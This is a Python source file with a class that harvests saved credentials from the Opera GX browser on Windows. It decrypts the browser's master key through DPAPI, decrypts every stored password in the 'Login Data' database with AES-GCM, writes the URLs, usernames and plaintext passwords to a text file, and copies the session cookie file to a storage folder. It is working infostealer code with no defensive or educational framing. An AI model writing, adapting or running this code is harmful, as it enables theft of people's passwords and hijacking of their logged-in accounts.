import json
import base64
import shutil

from sqlite3 import connect
from os import environ, sep, path, remove

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


class Opera_GX:

    def __init__(self, storage_path: str, storage_folder: str):

        self.storage_path = storage_path
        self.storage_folder = storage_folder

        self.state_path = environ['USERPROFILE'] + sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Local State'
        self.cookies_path = environ['USERPROFILE'] + sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Cookies'
        self.passwords_path = environ['USERPROFILE'] + sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Login Data'

    def __get_key(self):

        with open(self.state_path, "r", encoding='utf-8') as state:
            local_state = json.loads(state.read())

        return CryptUnprotectData(base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]

    def __decrypt_password(self, buff, master_key):

        try:

            return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()

        except:

            return "Old version"

    def __write_passwords(self, cursor, master_key):

        with open(f"{self.storage_path}{self.storage_folder}Opera GX Passwords.txt", "a", encoding='utf-8') as passwords:

            results = cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall()

            for result in results:

                password = self.__decrypt_password(result[2], master_key)

                if (result[0], result[1], password) != ("", "", ""):

                    passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")

                else:

                    continue

        passwords.close()

    def run(self):

        try:

            if (path.exists(self.passwords_path)) is True:

                master_key = self.__get_key()
                shutil.copyfile(self.passwords_path, f"{self.storage_path}Opera_GX.db")

                with connect(f"{self.storage_path}Opera_GX.db") as connection:

                    cursor = connection.cursor()

                    self.__write_passwords(cursor, master_key)

                    cursor.close()

                connection.close()

            if (path.exists(self.cookies_path)) is True:

                shutil.copyfile(self.cookies_path, f"{self.storage_path}{self.storage_folder}Opera GX Cookies", follow_symlinks=True)

            remove(f"{self.storage_path}Opera_GX.db")

        except Exception as e:
            print(repr(e))
